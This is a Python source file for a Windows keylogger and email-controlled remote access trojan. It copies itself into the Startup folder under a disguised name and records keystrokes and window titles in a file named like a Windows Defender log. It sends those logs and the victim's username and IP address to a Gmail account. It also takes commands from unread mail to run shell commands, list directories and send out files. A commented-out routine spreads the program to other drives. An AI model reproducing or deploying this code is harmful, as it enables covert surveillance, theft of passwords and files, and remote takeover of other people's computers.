import pythoncom,pyHook,subprocess
import getpass,shutil
import os,sys,ctypes
import threading,win32api,win32gui
import time
import imaplib
import email,email.header
import ipgetter,smtplib
import base64
from email import encoders
from base64 import b64decode
from threading import Thread
#from multiprocessing import Process
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from email.utils import COMMASPACE, formatdate

currentpath=sys.executable
sydrive=os.getenv('SystemDrive')
currentuser=getpass.getuser()
tostartup='%s\Documents and Settings\%s\Start Menu\Programs\Startup'%(sydrive,currentuser)
try:
    shutil.copy(currentpath,tostartup)
    try:
        os.startfile((tostartup+'\Task Manager Support.exe'),'open')
    except Exception as e:
        time.sleep(0.1)
except Exception as e:
    time.sleep(0.1)

if currentpath!=(tostartup+'\Task Manager Support.exe'):
    sys.exit()

#######################################
gmail_user = 'xxx@gmail.com'
gmail_pwd = 'xxxxxx'
server = 'smtp.gmail.com'
server_port = 587
#######################################
sub_header=ipgetter.myip()

try:
    msg = MIMEMultipart()
    msg['To'] = gmail_user
    msg['Subject'] = 'ONLINE'

    message_content = (currentuser+'\n'+sub_header)
    msg.attach(MIMEText(str(message_content)))

    while True:
        mailServer = smtplib.SMTP()
        mailServer.connect(server, server_port)
        mailServer.starttls()
        mailServer.login(gmail_user,gmail_pwd)
        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
        mailServer.quit()
        break
except Exception as e:
    time.sleep(0.1)


#fil='%s\ProgramData\Windows_Defender_Log.ini'%(sydrive)
fil='%s\Documents and Settings\%s\Start Menu\Programs\Windows_Defender_Log.ini'%(sydrive,currentuser)


def one_():
    def OnKeyboardEvent(event):
        
        if event.Ascii==5:
                _exit(1)
        if event.Ascii:
            #open output.txt to read current keystrokes
            f=open(fil,'a')
            f=open(fil,'r')
            buffer=f.read()
            f.close()
            #open output.txt to write current + new keystrokes
            try:
                f=open(fil,'w')
                keylogs=chr(event.Ascii)
                if event.Ascii==13:
                    keylogs='\n'
                if event.Ascii > 32 :
                    keylogs=chr(event.Ascii)
                if event.Ascii==8:
                    keylogs='[-]'
                buffer+=keylogs
                f.write(buffer)
                f.close()
            except Exception as e:
                time.sleep(1)
            
    # create a hook manager object
    hm=pyHook.HookManager()
    hm.KeyDown=OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()

def two_():
    while 1:
        print 'WARNING! sENDING MAIL AFTER 30 SEC'
        time.sleep(300)
        if os.path.exists(fil):
            f=open(fil)
            i=f.read()
            f.close()
            msg = MIMEMultipart()
            msg['From'] = sub_header
            msg['To'] = gmail_user
            msg['Subject'] = currentuser+' , '+sub_header

            message_content = i
            msg.attach(MIMEText(str(message_content)))

            while True:
                    try:
                        mailServer = SMTP()
                        mailServer.connect(server, server_port)
                        mailServer.starttls()
                        mailServer.login(gmail_user,gmail_pwd)
                        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                        mailServer.quit()

                        c=open(fil,'r')
                        lines=c.read()
                        c.close()
                        p = lines[-5:]
                        open(fil,'w').write(p)
                        break
                    except Exception as e:
                        #if verbose == True: print_exc()
                        time.sleep(1)
            

def three_():
    EMAIL_FOLDER = "INBOX"
    while 1:
      try:
        M = imaplib.IMAP4_SSL('imap.gmail.com')
        rv, data = M.login(gmail_user, gmail_pwd)
        rv, data = M.select(EMAIL_FOLDER)
            
        rv, data = M.search(None, "UNSEEN")

        for num in data[0].split():
                
            rv, data = M.fetch(num, '(RFC822)')

            msg = email.message_from_string(data[0][1])
            decode = email.header.decode_header(msg['Subject'])[0]
            subject = unicode(decode[0])

            if subject[:4]=='cmd ':
                proc2=subprocess.Popen(subject[4:],shell=True,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE)
                print 'CMD executed'
                stdout_value=proc2.stdout.read()+proc2.stderr.read()
                args=stdout_value

                try:
                    
                    msg = MIMEMultipart()
                    msg['To'] = gmail_user
                    msg['Subject'] = 'cmD Result'

                    message_content = (str(args))
                    msg.attach(MIMEText(str(message_content)))

                    while True:
                    
                        mailServer = smtplib.SMTP()
                        mailServer.connect(server, server_port)
                        mailServer.starttls()
                        mailServer.login(gmail_user,gmail_pwd)
                        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                        mailServer.quit()
                        break
                        
                    time.sleep(5) 
                        
                except Exception as e:
                    print e
                    time.sleep(0.1)
                

            if subject[:6]=='files ':
                try:
                    paths=os.listdir(subject[6:])
                    msg = MIMEMultipart()
                    msg['To'] = gmail_user
                    msg['Subject'] = '['+subject[6:]+']'+' Contents'

                    message_content = (paths)
                    msg.attach(MIMEText(str(message_content)))

                    while True:
                    
                        mailServer = smtplib.SMTP()
                        mailServer.connect(server, server_port)
                        mailServer.starttls()
                        mailServer.login(gmail_user,gmail_pwd)
                        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                        mailServer.quit()
                        break
                        
                    time.sleep(5) 
                        
                except Exception as e:
                    time.sleep(0.1)

            if subject[:6]=='info':
                
                try:
                    drives = win32api.GetLogicalDriveStrings()
                    drive_ = drives.split('\000')[:-1]
                    available='\n'+'Available Drives >>>>: '+'['+str(drive_)+']'
                    drive=os.getenv('SystemDrive')
                    drivee='\n'+'System Drive >>>>:    '+'['+drive+']'
                    uzer='User >>>>:             '+'['+currentuser+']'
                    
                    msg = MIMEMultipart()
                    msg['To'] = gmail_user
                    msg['Subject'] = 'SYSTEM INFORMATION'

                    message_content = (uzer+drivee+available)
                    msg.attach(MIMEText(str(message_content)))

                    while True:
                    
                        mailServer = smtplib.SMTP()
                        mailServer.connect(server, server_port)
                        mailServer.starttls()
                        mailServer.login(gmail_user,gmail_pwd)
                        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                        mailServer.quit()
                        break
                except Exception as e:
                    time.sleep(0.1)
                time.sleep(5)    

            if subject[:8]=='harvest ':
              try:
                attach=subject[8:]
                msg = MIMEMultipart()
                msg['From'] = 'Requested Attachment'
                msg['To'] = gmail_user
                msg['Subject'] = 'Requested Attachment'

                message_content = ('')
                msg.attach(MIMEText(str(message_content)))

                
                if os.path.exists(attach) == True:
                        filo=open(attach,'rb')
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload((filo).read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                        msg.attach(part)

                while True:
                    
                    mailServer = smtplib.SMTP()
                    mailServer.connect(server, server_port)
                    mailServer.starttls()
                    mailServer.login(gmail_user,gmail_pwd)
                    mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                    mailServer.quit()
                    break
              except Exception as e:
                  time.sleep(5)


            if subject[:4]=='help':
                try:
                    
                    msg = MIMEMultipart()
                    msg['To'] = gmail_user
                    msg['Subject'] = 'HELP - COMMANDS'

                    helpa=('> info - sys drive letter,etc , no arguments \n'+
                           '> files - [directory contents] \n'+
                           '> harvest - [certain document path 4 download] \n'+
                           '> cmd - cmd [command] \n')
                    message_content = (helpa)
                    msg.attach(MIMEText(str(message_content)))

                    while True:
                    
                        mailServer = smtplib.SMTP()
                        mailServer.connect(server, server_port)
                        mailServer.starttls()
                        mailServer.login(gmail_user,gmail_pwd)
                        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                        mailServer.quit()
                        break
                        
                    time.sleep(5) 
                        
                except Exception as e:
                    time.sleep(0.1)
                   
                

        M.close()
      except Exception as e:
          print e
          time.sleep(5)

def windowtitles():
    print 'windowtitles running'
    while 1:
        f=open(fil,'a')
        wintit1 = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        tolog='\n'+'[WINDOW] '+str(wintit1)+'\n'
        f.write(tolog)
        print 'logging window title...'
        f.close()
        #print wintit1
        while 1:
            wintit2 = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if wintit2!=wintit1:
                break
            time.sleep(1)
    

'''def four_():
    try:
        while 1:
            drives = win32api.GetLogicalDriveStrings()
            drive_ = drives.split('\000')[:-1]
            ngapi=len(drive_)
            i=-1
            
            while i<(ngapi-1):
                i=i+1
                freebytes=ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_[i]),None,None,
                                           ctypes.pointer(freebytes))

                if freebytes.value !=0:
                    try:
                        shutil.copy(currentpath,drive_[i])
                    except Exception as e:
                        time.sleep(0.1)
            time.sleep(30)
    except Exception as e:
        time.sleep(1)'''
    
           
        
if __name__=='__main__':
    Thread(target=one_).start()
    print 'one running'
    Thread(target=two_).start()
    print 'two running'
    Thread(target=three_).start()
    print '3 running'
    Thread(target=windowtitles()).start()
    
    #Thread(target=four_()).start()
    #print 'last running'


    

